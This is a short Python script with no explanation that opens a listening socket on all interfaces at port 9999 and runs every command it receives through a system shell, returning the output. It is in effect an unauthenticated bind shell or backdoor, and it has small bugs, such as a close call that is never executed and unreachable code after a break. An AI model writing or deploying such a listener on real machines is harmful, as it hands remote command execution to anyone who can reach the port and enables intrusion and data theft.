import socket
import subprocess

def create_connection():
    host='0.0.0.0'
    port= 9999
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(2)
    conn, addr= server_socket.accept()

    while True:
        command = conn.recv(1024).decode().split()
        if not command or command[0] == "exit":
            break
            return(1)
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            conn.sendall(output)
        except subprocess.CalledProcessError as e:
            conn.sendall(e.output)
    conn.close
    server_socket.close()
create_connection()
